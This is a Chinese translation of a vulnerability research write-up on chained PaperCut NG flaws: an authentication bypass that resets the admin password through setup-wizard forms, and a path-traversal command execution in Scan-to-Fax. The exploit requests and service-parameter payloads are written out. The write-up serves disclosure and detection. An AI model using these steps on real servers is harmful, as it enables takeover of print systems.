#  补丁地狱：PaperCut 三次修补三次被绕过的漏洞挖掘全记录  
watchtowr
                    watchtowr  潇湘信安   2026-10-29 00:45  
  
<table><thead><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;background-color: rgb(255, 255, 255);border-top: 1px solid rgba(209, 217, 224, 0.7);"><th data-colwidth="390" style="padding: 6px 13px;-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;word-break: break-all;hyphens: auto;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;"><span leaf=""><span textstyle="" style="font-size: 14px;">Ima知识库名称</span></span></section></th><th data-colwidth="171" style="padding: 6px 13px;-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;word-break: break-all;hyphens: auto;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">加入条件</span></span></section></th></tr></thead><tbody><tr><td data-colwidth="390"><p><span leaf=""><a class="weapp_text_link js_weapp_entry" style="" data-unique-id="mmgq2ycy-fenn11" data-miniprogram-type="text" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-path="pages/index/index?shareId=5a450acc0ba7011d52e5087819ece0eaaf0706e9dee5bfce575c9c243bd86cc5" data-miniprogram-nickname="ima知识库" data-miniprogram-servicetype="0" data-miniprogram-applink=""><span textstyle="" style="font-size: 14px;">潇湘信安协同知识库（更新~ing!）</span></a></span></p></td><td data-colwidth="171"><p style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">限时免费</span></span></p></td></tr><tr><td data-colwidth="390"><p><span leaf=""><a class="weapp_text_link js_weapp_entry" style="" data-unique-id="mmgq3uc4-4eb0f6" data-miniprogram-type="text" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-path="pages/index/index?shareId=e3cb38cefa77595a6e512eae049953037e275bbab66071ed2f33d98fdf64e6f3" data-miniprogram-nickname="ima知识库" data-miniprogram-servicetype="0" data-miniprogram-applink=""><span textstyle="" style="font-size: 14px;">潇湘信安学习资料库（更新~ing!）</span></a></span></p></td><td data-colwidth="171"><p style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">≥3年粉丝</span></span></p></td></tr><tr><td data-colwidth="390"><p><span leaf=""><a class="weapp_text_link js_weapp_entry" style="" data-unique-id="mmgq4fe2-yfukhq" data-miniprogram-type="text" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-path="pages/index/index?shareId=da55c9143f5ee86a843ae20db3b689d73aa80ae9334b701add96a22ec001ac1c" data-miniprogram-nickname="ima知识库" data-miniprogram-servicetype="0" data-miniprogram-applink=""><span textstyle="" style="font-size: 14px;">潇湘信安内部知识库（更新~ing!）</span></a></span></p></td><td data-colwidth="171"><p style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">星球成员</span></span></p></td></tr></tbody></table>  
现在只对常读和星标公众号才展示大图推送，建议大家把“  
潇湘信安  
”  
设为星标  
，  
否则可能看不到了  
！  
### WT-2026-0141~0144 / CVE-2026-82077 / CVE-2026-82078 / CVE-2026-81578 全漏洞链技术分析  
## 什么是 PaperCut？  
  
对于不了解的人来说，PaperCut 是一款打印管理软件，帮助组织监控、控制和保护其网络中的打印活动。其核心功能包括打印配额、安全释放打印（用户在打印机上登录后才释放打印任务）、成本追踪和详细报告。这些功能共同帮助削减打印成本、减少纸张浪费并防止未经授权的使用。  
  
它被广泛应用于学校、大学、医疗机构、政府机构、律师事务所以及各种规模的企业。这种多样性使其成为 APT（高级持续性威胁）组织和勒索软件团伙的诱人目标，此前多个被野外利用的漏洞（如 CVE-2023-27351 和 CVE-2023-27350）已经证明了这一点。  
## 时间线一览  
  
8月27日至9月1日期间发生了很多事情，让我们为你梳理完整的时间线，其中包含一些"剧透"。  
> **作者注：**  
 尽管 CVE 是在两轮补丁之后才分配的，但我们在时间线的开头就使用 CVE 编号，以避免不同漏洞之间的混淆。  
  
### 2026年8月27日  
- PaperCut 发布了一份公告，涉及一个针对 26.0.3 版本的野外利用漏洞。公告没有附带补丁——被利用的漏洞仍未修复。  
  
- 此时尚未分配任何 CVE，仅发布了 IOC（没有漏洞详情，也没有可用的补丁）。  
  
- 由于没有漏洞细节或数量信息，我们开始仅凭 IOC 盲目地进行复现。没有补丁可用，因此我们必须从零开始发现这些 0day 漏洞。  
  
- 使用未打补丁的 PaperCut 版本，我们发现了后认证 RCE 漏洞（后来被确认为 CVE-2026-82078），与 PaperCut 分享的野外 IOC 相匹配。  
  
- 然而，我们当时还不知道如何在未认证的情况下利用此漏洞。  
  
- PaperCut 发布了补丁（PaperCut NG 的 26.0.4 版本）。此时，我们终于可以进行补丁对比，这可能帮助我们找到无需认证即可利用后认证 RCE 的方法。  
  
- 我们分析了 26.0.4 中的代码变更，确认我们已正确复现了 CVE-2026-82078（后认证 RCE），并识别和复现了 CVE-2026-81578（认证绕过）——即完整的野外利用链。  
  
- 然而，在此过程中，我们发现了一种绕过 CVE-2026-82078（后认证 RCE）补丁的方法  
  
- 此漏洞已报告给 PaperCut，内部编号为 WT-2026-0141。  
  
### 2026年8月28日  
- 我们发现了一种绕过 CVE-2026-81578（认证绕过漏洞）补丁的机制  
  
- 此漏洞已报告给 PaperCut，内部编号为 WT-2026-0142。  
  
- 这意味着我们现在又拥有了一条完整的预认证 RCE 利用链（针对当时最新的 26.0.4 版本有效），通过组合以下两个漏洞：  
  
- WT-2026-0141 - 后认证 RCE 漏洞  
  
- WT-2026-0142 - 认证绕过漏洞  
  
- PaperCut 迅速发布了另一个补丁——公开称为 **26.0.4-PO build 76508**  
，其中包含对以下漏洞的修复：  
  
- WT-2026-0141 - 后认证 RCE 漏洞  
  
- WT-2026-0142 - 认证绕过漏洞  
  
- 我们再次对 **26.0.4-PO build 76508**  
 进行分析，并发现了一种绕过 WT-2026-0142（认证绕过）修复的机制。  
  
- 此漏洞已报告给 PaperCut，内部编号为 WT-2026-0143。  
  
### 2026年8月31日  
- 像一只咬住骨头不放的狗，我们在分析 **26.0.4-PO build 76508**  
 时偶然发现了一个全新的后认证 RCE 漏洞。  
  
- 此漏洞已报告给 PaperCut，内部编号为 WT-2026-0144（即现在的 CVE-2026-82077）。  
  
- 这意味着我们现在又拥有了一条完整的预认证 RCE 利用链，通过组合：  
  
- WT-2026-0143 认证绕过漏洞  
  
- WT-2026-0144（CVE-2026-82077）后认证 RCE 漏洞  
  
### 2026年9月1日  
- PaperCut 发布了新补丁 **26.0.4-PO build 76530**  
。  
  
- 补丁包含对 WT-2026-0143（认证绕过）的修复  
  
### 2026年9月10日  
- PaperCut 发布了新补丁 **26.0.5**  
  
- 补丁包含对 WT-2026-0144/CVE-2026-82077（后认证 RCE）的修复  
  
## 漏洞全景总览  
  
总而言之——简单来说，漏洞实在太多了。让我们在下面总结一下：  
### 野外被利用的漏洞（26.0.3 版本）  
- 在互联网上"满天飞"的：  
  
- CVE-2026-81578（认证绕过）  
  
- CVE-2026-82078（后认证 RCE）  
  
然后……故事还在继续。  
### 第一个补丁（26.0.4 版本）  
- watchTowr 在分析补丁时发现的漏洞：  
  
- CVE-2026-81578（认证绕过）补丁的绕过  
  
- CVE-2026-82078（后认证 RCE）补丁的绕过  
  
- WT-2026-0141（未分配 CVE）  
  
- WT-2026-0142（未分配 CVE）  
  
### 第二个补丁（26.0.4-PO build 76508 版本）  
- watchTowr 在分析补丁时发现的漏洞：  
  
- 发现了一个全新的后认证 RCE，与 WT-2026-0143 认证绕过配合完成完整利用链  
  
- WT-2026-0142（认证绕过）补丁的绕过  
  
- WT-2026-0143（未分配 CVE）  
  
- CVE-2026-82077 / WT-2026-0144  
  
我们知道你要说什么了——"watchTowr，你们疯了吗？已经有分析发布了，为什么还要重写已有的分析？"  
  
亲爱的读者，正如你从上面看到的，这简直是一部史诗。所以今天，我们将深入探讨在 26.0.4-PO build 76508 版本中发现的漏洞（上文已简要提及）：  
- WT-2026-0143：认证绕过漏洞（未分配 CVE 编号）  
  
- WT-2026-0144（CVE-2026-82077）：后认证 RCE 漏洞  
  
为什么是这两个？原因如下：  
- 它们超级酷  
  
- 它们能在 PaperCut 26.0.4-PO build 76508 上实现完整的未认证 RCE 利用链  
  
- 它们尚未被记录在案（希望这也能让我们显得很酷）  
  
- WT-2026-0143 和 WT-2026-0144（CVE-2026-82077）都是崭新的  
  
![Cool Meme](https://mmbiz.qpic.cn/sz_mmbiz_png/tNyBeBKReNKibBZEZrGa01GIMEShtJuuBPTJMWAlU65ZjRGA5nmDwdczed2r0tQcvpUEibibKqD3xticnmjreJCb2JrjqI978QSNRCaicKPK4qD0/640?wx_fmt=png&from=appmsg "")  
  
Cool Meme  
## 认证绕过漏洞的补丁绕过（WT-2026-0143）  
  
简单来说，这是关于 WT-2026-0143 的，它是对 CVE-2026-81578 认证绕过漏洞的补丁的绕过的绕过。  
  
我们假设你可能已经阅读、复习并背诵了关于在 26.0.3 版本中被野外利用的认证绕过漏洞（CVE-2026-81578）的分析文章。  
  
你可能也看过关于第一批绕过漏洞的技术分析，这些漏洞影响了 PaperCut 发布的第一个补丁 26.0.4。  
> **编辑：**  
 这简直是补丁地狱，老实说我都快跟不上了。  
  
  
如果没有，抱歉——你可以去谷歌搜索。"我也是"式的内容会受到我们毛茸茸的朋友们的强烈反对，他们已经因为我们考虑用 LLM 取代他们而感到沮丧。  
  
长话短说：PaperCut 使用 Apache Tapestry 3 框架来处理网页。PaperCut 还有多个以 Java 类实现的页面，每个页面都有自己的权限集。  
  
我们使用 Tapestry 的 service  
 参数来定义要访问的页面或表单。  
  
问题在于 PaperCut 没有预见到以下情况：  
- 在 service  
 参数中定义一个无需认证的页面（如 LogonMessage  
），它将成为根页面  
  
- 然后定义另一个需要认证才能调用的页面及其表单  
  
结果是什么？未认证的攻击者可以访问需要认证的页面的表单。  
  
这种行为可以通过使用 service  
 参数的单个请求来利用，如下所示：  
```
service=direct/1/LogonMessage/ConfigEditor/quickFindForm
```  
  
为什么？怎么会？魔法。  
  
不过，这种特殊的"魔法"是 Apache Tapestry 的魔法，它非常乐意调用根页面以及在 service  
 中定义的后续页面。我们首先到达 LogonMessage  
，然后跳转到 ConfigEditor  
 页面及其 quickFindForm  
 表单。  
  
等等，PaperCut 没有实现授权吗？嗯，有的。授权在 BasePaperCutPage.pageValidate  
 方法中实现，多个页面（如 LogonMessage  
）都继承了这个方法。然而，代码只检查根页面的授权，也就是我们例子中的 LogonMessage  
，而这个页面不需要认证。同样，在单个 service  
 参数中定义多个页面的可能性并未被纳入授权逻辑。  
  
**等等，我们好像见过类似的东西。**  
 这让我们回想起了 SolarWinds Web Help Desk 的研究。如果你还记得，或者很不幸还在为浪费时间阅读我们的博客文章而耿耿于怀，你会记得我们发现了多个认证绕过漏洞，因为 SolarWinds WHD 使用了一个在我们 10 岁时就已经过时的 WebObjects 框架。  
  
那些绕过漏洞极难发现，因为 50 岁以下的人几乎没人知道这些框架是怎么回事。  
  
而 50 岁以上了解这些框架的人，则对它们恨之入骨，宁愿部署一款"领先的"SSLVPN解决方案。  
  
今天，我们面临着类似的情况。已经过时约 20 年的 Apache Tapestry 3，在安全研究人员中并不广为人知。  
  
而且显然，使用它的开发人员也不太了解它。  
  
![Old Framework Meme](https://mmbiz.qpic.cn/mmbiz_png/tNyBeBKReNLTHwKvic9yFgibCiackfAYicqK5eibealmpmaKVM6iaJ1EAIaJGHibdpvjQibWppsEV60GnJHibJUIrNVjETRlibKyib90RUtxF1wQXur4hM/640?wx_fmt=png&from=appmsg "")  
  
Old Framework Meme  
## 最新认证绕过漏洞（WT-2026-0143）详解（针对 26.0.4-PO build 76508 补丁）  
  
"天啊，watchTowr 闭嘴吧"——好的，好的。  
  
我们现在至少已经解释了 CVE-2026-81578 背后的基本行为。在 PaperCut 的第一轮补丁（26.0.4）中，实施了临时保护以阻止某些攻击向量。  
  
例如：  
- 在 BasePaperCutPage.pageValidate  
 中增加了递归页面权限检查，因此使用 LogonMessage  
 页面的绕过不再可能  
  
- 事实证明你可以使用不继承 BasePaperCutPage  
 的 Home  
 页面来再次绕过补丁  
  
- 因此下一个补丁为敏感页面的表单添加了手动授权检查，比如 ConfigEditor  
（顺便说一句，这个就是被野外利用的那个）  
  
尽管如此，由于没有对所有页面实施全局授权检查，很难跟踪并手动验证代码库中的每个页面。  
  
这就是我们如何意识到仍然可以滥用设置向导（Setup Wizard）表单的——因为在之前交付的补丁中，它们完全被忽略了。  
  
你可以想象，PaperCut 有一个初始设置过程：  
  
![PaperCut Setup Wizard](https://mmbiz.qpic.cn/sz_mmbiz_png/tNyBeBKReNJrzAicZ05LmSOduSywK9FGYpUicD5ulUialUwZBPxqQo6lskzbTlhRThkIKcia8J52n0QU3NSG7w3RKDnk9VCia7GicUicq1BfFib8hlg/640?wx_fmt=png&from=appmsg "")  
  
PaperCut Setup Wizard  
  
  
如你所见，有几个子页面，如"创建账户"或"选择组织类型"。  
  
在初始产品设置完成后，PaperCut 将 system.setup-completed  
 设置为 Y  
。  
  
为什么这很重要？每个设置子页面（如 SetupAdmin  
）都继承自 BaseSetupPage  
，它实现了以下授权方法：  
```
public void pageValidate(PageEvent event) {    WebUtils.ensureCompatibleBrowserForAdmin(event.getRequestCycle().getRequestContext().getRequest());    if (this.getConfigManager().getBoolean("system.setup-completed")) {        WebUtils.redirectToPage(event.getRequestCycle().getPage("Home"));    }}
```  
  
如果 system.setup-completed  
 返回 true  
，我们会被重定向，设置页面不会被触发。而这就是我们的认证绕过漏洞的用武之地。  
  
想象一下，在设置已经完成后，你想访问其中一个设置页面（SetupAdmin  
）。  
  
你可能会认为可以这样做：将 service  
 参数设置为 direct/1/SetupAdmin/$Form  
。然而，这行不通，因为代码会调用 BaseSetupPage.pageValidate  
（如上所示，SetupAdmin 使用了这个方法），因此会将我们重定向回 Home  
，而不是执行设置表单。  
  
但是，我们可以通过 Home  
 页面直接访问设置向导表单的每一步，即使产品已经部署完成。  
  
为什么？让我们逐步分析：  
- 你通过 Home  
 页面（通过 service 参数）调用一个示例设置页面，如下所示：/app?service=direct/1/Home/SetupAdmin/$Form  
（我们想通过 Home  
 在预认证状态下到达 SetupAdmin  
）  
  
- 框架因此会尝试调用 Home.pageValidate  
 来验证你的权限，但会跳过 SetupAdmin.pageValidate  
 方法（不会被调用）  
  
- Home  
 可以在预认证状态下访问，因此未认证的攻击者不会被阻止，并成功到达 SetupAdmin  
 页面  
  
由于绕过漏洞，设置页面的 pageValidate  
 方法永远不会被调用，因此 system.setup-completed  
 的值对攻击者来说无关紧要。  
  
如果你想使用设置过程重置管理员密码，你需要逐步完成。这意味着你需要使用认证绕过调用每个设置页面。完整过程包括四个请求：  
- POST /app?service=direct/1/Home/SetupAdmin/$Form  
 — 在此处更改管理员密码  
  
- POST /app?service=direct/1/Home/SetupOrgType/$Form  
 — 在此处设置组织类型  
  
- POST /app?service=direct/1/Home/SetupUserSource/$Form  
 — 在此处选择用户同步源（在我们的 PoC 中选择不进行同步）  
  
- POST /app?service=direct/1/Home/SetupVerify/$Form  
 — 在此处确认设置已完成  
  
瞧。你已经强制执行了一次"全新"的产品设置，并成功修改了管理员用户密码，至此我们对针对 26.0.4-PO build 76508 版本有效的认证绕过漏洞（WT-2026-0143）的解释就结束了。  
  
开个玩笑，让我们在检测工具生成器中展示一下效果：  
  
![DAG Demo](https://mmbiz.qpic.cn/mmbiz_png/tNyBeBKReNLYicLo2cd3H5TQeW2lh9ItKhSvxvQU3LnOeXqC1vialxQCQKF4icpnEBjz0qkGjK5PcHrTdGpGtrEmReo3rgpeU8via74CH0UW2e8/640?wx_fmt=png&from=appmsg "")  
  
DAG Demo  
  
  
那么，接下来呢？我们想要更多（RCE，我们想要 RCE）。  
## 后认证 RCE：WT-2026-0144（CVE-2026-82077）  
  
现在，正如你在上面看到的，我们已经证明了 WT-2026-0143 可用于绕过认证并在当时最新版本的 PaperCut（26.0.4-PO build 76508）上修改管理员密码。  
  
打了补丁之后，原来野外利用的后认证 RCE 漏洞通过对 security.properties  
 文件的修改被"彻底移除"了。如果你还记得，那个漏洞是基于控制 JDBC 连接 URL 并触发任意连接，通过 security.properties  
 配置文件被封堵了。  
  
一条路被堵死了，但还有大量功能可以探索——我们认为值得寻找新的路径。  
  
一段时间后，我们的目光落在了"扫描到传真"（Scan to Fax）功能上。为什么？因为这个功能最终会导致操作系统命令的执行，所以调查它是理所当然的。  
  
通过正确定义作业服务，攻击者可以到达 biz.papercut.pcng.service.scan.FaxProviderManagerImpl.sendFaxJob  
 方法，而 ScanFaxJob  
 类型的输入参数完全由攻击者控制。  
```
public void sendFaxJob(ScanFaxJob job) throws RuntimeException, InterruptedException { // [1]    logger.debug("Sending fax job {} to provider {}", job.getFaxJob(), job.getProviderConnector());    FaxJob faxJob = job.getFaxJob();    String jobStr;    try {       jobStr = this.convertFaxJobToJSON(faxJob);    } catch (IOException var12) {       logger.error("Unable to convert fax job {} to JSON file", job.getFaxJob());       throw new IllegalArgumentException("Unable to convert fax job to JSON file");    }    Path jobFile = this.createStringJsonFile(jobStr, "papercut-scan-fax-job");    if (jobFile == null) {       throw new IllegalArgumentException("Unable to create fax job file");    } else {       Path settingsFile = this.createStringJsonFile(job.getProviderSettingsJson(), "papercut-scan-fax-settings");       if (settingsFile == null) {          this.deleteTmpFile(jobFile);          throw new IllegalArgumentException("Unable to create fax settings file");       } else {          String template = this.configManager.getString("system.scan.fax.send.command-args"); // [2]          String testOptions = this.configManager.getString("system.scan.fax.test.options");          logger.debug("Using the following fax connector template: '{}'", template);          logger.debug("Using job contents of: {}", jobStr);          String[] cmdArray = (String[])Arrays.stream(template.split("\\s+")).map((str) -> str.replace("%job%", this.quote(jobFile.toAbsolutePath().toString())).replace("%settings%", this.quote(settingsFile.toAbsolutePath().toString())).replace("%test-options%", testOptions)).toArray((x$0) -> new String[x$0]); // [3]          try {             this.runCommand(job.getProviderConnector(), cmdArray, this.configManager.getIntegerWithDefault("system.scan.fax.send.timeout-secs", 30)); // [4]          } finally {             if (!testOptions.contains("-o keeptmp=Y")) {                this.deleteTmpFile(jobFile);                this.deleteTmpFile(settingsFile);             }          }       }    } }
```  
1. 在 [1]  
 处，sendFaxJob  
 方法被定义，接收攻击者控制的 ScanFaxJob  
 对象  
  
1. 在 [2]  
 处，代码提取 system.scan.fax.send.command-args  
 设置并将其存储为 template  
 选项  
  
1. 在 [3]  
 处，代码基于 template  
 创建 cmdArray  
  
1. 在 [4]  
 处，runCommand  
 被执行，第一个参数是来自 job.getProviderConnector  
 的攻击者控制值  
  
看看下面的代码片段，我们可以看到 ScanFaxJob  
 的实现：  
```
public class ScanFaxJob {   FaxJob faxJob;   String providerConnector;   String providerSettingsJson;   public ScanFaxJob(String providerConnector, String providerSettingsJson, FaxJob faxJob) {      this.providerConnector = providerConnector;      this.providerSettingsJson = providerSettingsJson;      this.faxJob = faxJob;   }   public FaxJob getFaxJob() {      return this.faxJob;   }   public String getProviderSettingsJson() {      return this.providerSettingsJson;   }   public String getProviderConnector() {      return this.providerConnector;   }}
```  
  
providerConnector  
 成员在任何时候都没有被验证，这给了我们更多希望……  
  
让我们看看 runCommand  
：  
```
private String runCommand(String connector, String[] cmdArray, final int timeOutSecs) throws RuntimeException, InterruptedException {  StringBuffer stdout = new StringBuffer();  StringBuffer stderr = new StringBuffer();  int exitCode = this.runCommandBuffers(connector, cmdArray, timeOutSecs, stdout, stderr); // [1]  if (exitCode != 0) {     throw new RuntimeException("Fax connector failed: " + cmdArray[0]);  } else {     return stdout.toString();  }}
```  
  
在 [1]  
 处，它调用 runCommandBuffers  
：  
```
private int runCommandBuffers(String connector, String[] cmdArray, final int timeOutSecs, StringBuffer stdout, StringBuffer stderr) throws InterruptedException, RuntimeException {if (stdout == null) {     stdout = new StringBuffer();  }if (stderr == null) {     stderr = new StringBuffer();  }  cmdArray = (String[])ObjectArrays.concat(this.getAbsoluteBinaryPath(connector), cmdArray); // [1]String cmdLine = String.join(System.lineSeparator(), cmdArray);  logger.debug("Using the fax connector with an adjusted path \"{}\"", cmdLine);try {     int exitCode = ProcessUtils.execAndGetOutput(cmdArray, (boolean[])null, stdout, stderr, timeOutSecs); // [2]//...}
```  
1. 在 [1]  
 处，它创建了一个新的 cmdArray  
，但攻击者控制的 connector  
 首先经过了 getAbsoluteBinaryPath  
 处理  
  
1. 在 [2]  
 处，它使用 ProcessUtils.execAndGetOutput  
 执行命令  
  
拼图的最后一块在 getAbsoluteBinaryPath  
 中：  
```
private String getAbsoluteBinaryPath(final String commandName) {String var10000 = this.getFaxConnectorDirPath(); // [1]String path = var10000 + File.separator + commandName; // [2]  logger.debug("Getting absolute path: {}", path);if (Files.isExecutable(Paths.get(path))) {     return path;  } else {     path = path + ".exe";     if (Files.isExecutable(Paths.get(path))) {        return path;     } else {        logger.error("Could fax connector not be executable: {}", commandName);        throw new RuntimeException(path + " is not executable");     }  }}
```  
1. 在 [1]  
 处，它获取传真连接器的目录  
  
1. 在 [2]  
 处，它将我们的 connector 字符串追加到该目录后，**没有任何验证**  
。当然，这里也没有进行验证，因此我们面对的是一个**相对路径遍历**  
漏洞  
  
综上所述，攻击者可以：  
- 创建一个新的 ScanFaxJob  
，其中 providerConnector  
 设置为例如 ../../../../../../../../../../../../../Windows/System32/cmd  
。可以通过以下 HTTP 请求实现：  
  
```
POST /app HTTP/1.1Host: target:9191Origin: <http://target:9191>Cookie: org.apache.tapestry.locale=en; JSESSIONID=cookieContent-Length: 6853Content-Type: application/x-www-form-urlencodedscanActionType=FAX&label=test&faxProviderModel=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Ccmd&...removedforreadability...
```  
- 修改 system.scan.fax.send.command-args  
 配置参数为例如 /c whoami  
（通过配置编辑器页面）：  
  
![Config Editor](https://mmbiz.qpic.cn/mmbiz_png/tNyBeBKReNLPEvpQeK2Tf9M2H3IibyPbibw00iaaX3eqbPkI8IguzL4mqvcwNtbIOIzGUZOicPCfosfLRicESjJlR33egyblHGkeT7wHFoAvCVPU/640?wx_fmt=png&from=appmsg "")  
  
Config Editor  
- 触发一个新的扫描到传真作业  
  
- 收工  
  
![RCE Proof](https://mmbiz.qpic.cn/sz_mmbiz_png/tNyBeBKReNIrm8Yia9hI9osXdvKwD4274iaIxEIojfGlyamJ3y7aYMHTWZj6NaQJK3JOrE0gqRdeG2Vzz05uXd590emMerf0FfGxo6oxJ7abE/640?wx_fmt=png&from=appmsg "")  
  
RCE Proof  
  
就这样——一个新的后认证 RCE（CVE-2026-82077 / WT-2026-0144），结合我们的认证绕过漏洞（WT-2026-0143），让我们完成了通向 RCE 的完整利用链。  
## 完整利用链  
  
将所有内容串联起来（WT-2026-0143 + WT-2026-0144/CVE-2026-82077），我们终于可以在 PaperCut NG 26.0.4-PO build 76508 上弹 shell 了。  
  
![Full Chain Demo](https://mmbiz.qpic.cn/mmbiz_png/tNyBeBKReNIianIiaZnfhtiaZxbW6SeBdibgfgOk2QdLsNOU9aoswz9Nw4NziapQoUGpr2E9ecMcEUfLSFiaSQ807cLNQebU41k7TiaFTM1HYfLOick/640?wx_fmt=png&from=appmsg "")  
  
Full Chain Demo  
## 检测工具（Detection Artefact Generator）  
  
一如既往，我们分享我们的检测工具生成器（Detection Artefact Generator），以便你可以确定自己的受影响程度，并在自己的环境中进行修复。  
  
虽然 DAG 不执行完整的利用链，但它可以检测你是否暴露于我们上面讨论的认证绕过漏洞。  
  
你可以在我们的 GitHub 上找到它。  
  
![DAG GitHub](https://mmbiz.qpic.cn/sz_mmbiz_png/tNyBeBKReNJLZibibZBibV7MI21wiaWoQKNH1loMsKHnXGyiaMnVl8TwXeic3jhtg8Z5X2KF360o2fOGwakiav7vQ1z0rldN8Kw9gamn1MDkky5Wxs/640?wx_fmt=png&from=appmsg "")  
  
DAG GitHub  
> **原文出处：**  
watchTowr Labs  
  
> **翻译整理：**  
 技术翻译仅供学习参考，转载请注明出处****  
> **仓库地址：**  
   
> https://github.com/watchtowrlabs/watchTowr-vs-PaperCut-WT-2026-0143  
  
  
  
**关注我们**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
 还在等什么？赶紧点击下方名片开始学习吧   
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
**知 识 星 球**  
  
  
  
星球已过800人，暂不再发放优惠券，如还有需要的师傅可加我  
VX  
：**S_3had0w，等你一起来学习...！**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XOPdGZ2MYOe8h8vDq3IN1GhNuNnkbWYgcibYRicgo0SRy1febylE4kBDdibgIJV1ia1QNSBYiaZAZWCzAjESoYfxNjw/640?wx_fmt=jpeg&from=appmsg "")  
<table><thead><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;background-color: rgb(255, 255, 255);border-top: 1px solid rgba(209, 217, 224, 0.7);"><th data-colwidth="390" style="padding: 6px 13px;-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;word-break: break-all;hyphens: auto;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;"><span leaf=""><span textstyle="" style="font-size: 14px;">Ima知识库名称</span></span></section></th><th data-colwidth="171" style="padding: 6px 13px;-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;word-break: break-all;hyphens: auto;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">加入条件</span></span></section></th></tr></thead><tbody><tr><td data-colwidth="390"><p><span leaf=""><a class="weapp_text_link js_weapp_entry" style="" data-unique-id="mmgq2ycy-fenn11" data-miniprogram-type="text" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-path="pages/index/index?shareId=5a450acc0ba7011d52e5087819ece0eaaf0706e9dee5bfce575c9c243bd86cc5" data-miniprogram-nickname="ima知识库" data-miniprogram-servicetype="0" data-miniprogram-applink=""><span textstyle="" style="font-size: 14px;">潇湘信安协同知识库（更新~ing!）</span></a></span></p></td><td data-colwidth="171"><p style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">限时免费</span></span></p></td></tr><tr><td data-colwidth="390"><p><span leaf=""><a class="weapp_text_link js_weapp_entry" style="" data-unique-id="mmgq3uc4-4eb0f6" data-miniprogram-type="text" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-path="pages/index/index?shareId=e3cb38cefa77595a6e512eae049953037e275bbab66071ed2f33d98fdf64e6f3" data-miniprogram-nickname="ima知识库" data-miniprogram-servicetype="0" data-miniprogram-applink=""><span textstyle="" style="font-size: 14px;">潇湘信安学习资料库（更新~ing!）</span></a></span></p></td><td data-colwidth="171"><p style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">≥3年粉丝</span></span></p></td></tr><tr><td data-colwidth="390"><p><span leaf=""><a class="weapp_text_link js_weapp_entry" style="" data-unique-id="mmgq4fe2-yfukhq" data-miniprogram-type="text" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-path="pages/index/index?shareId=da55c9143f5ee86a843ae20db3b689d73aa80ae9334b701add96a22ec001ac1c" data-miniprogram-nickname="ima知识库" data-miniprogram-servicetype="0" data-miniprogram-applink=""><span textstyle="" style="font-size: 14px;">潇湘信安内部知识库（更新~ing!）</span></a></span></p></td><td data-colwidth="171"><p style="text-align: center;"><span leaf=""><span textstyle="" style="font-size: 14px;">星球成员</span></span></p></td></tr></tbody></table><table><tbody><tr><td data-colwidth="287"><section nodeleaf=""><mp-common-miniprogram class="js_uneditable custom_select_card mp_miniprogram_iframe" data-pluginname="insertminiprogram" data-miniprogram-path="pages/index/index?shareId=5a450acc0ba7011d52e5087819ece0eaaf0706e9dee5bfce575c9c243bd86cc5" data-miniprogram-nickname="ima知识库" data-miniprogram-avatar="http://mmbiz.qpic.cn/sz_mmbiz_png/JkibkGcLiaJbVFXj8nYrmL5iab8KYwalibCtCjnicUJ6KFK8G4uC0VgesgxIL1iaTckOZYlKXNEtaBNeazcD8PLcic0zA/640?wx_fmt=png&amp;wxfrom=200" data-miniprogram-title="潇湘信安协同知识库（更新~ing!）" data-miniprogram-imageurl="http://mmbiz.qpic.cn/mmbiz_jpg/zqnzfCSS1kB81aIibHjJDKmPS8BOiacfOmDUsm8ibwibG3bvo3EsfbkqO70BJNIo7rE4LqOia3xKRITWTZSOHKLwOO2ribkueicxLrLeEsV1FfDicus/0?wx_fmt=jpeg" data-miniprogram-type="card" data-miniprogram-servicetype="0" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-imageurlback="https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_jpg%2FzqnzfCSS1kDw29J3ia1mGnlrZzHxa4HsTezib66icQ99G6vicWPvurHOicRL3wMv4PUyOibicDeN00EnibyP8feJsmyKUYnRHNRP8CA8Ja2HnPB6Ed8%2F0%3Fwx_fmt%3Djpeg%26from%3Dappmsg" data-miniprogram-cropperinfo="%7B%22c%22%3A%7B%22x%22%3A0%2C%22y%22%3A59%2C%22x2%22%3A182%2C%22y2%22%3A204.6%2C%22w%22%3A182%2C%22h%22%3A145.6%7D%7D"></mp-common-miniprogram></section></td><td data-colwidth="287"><section 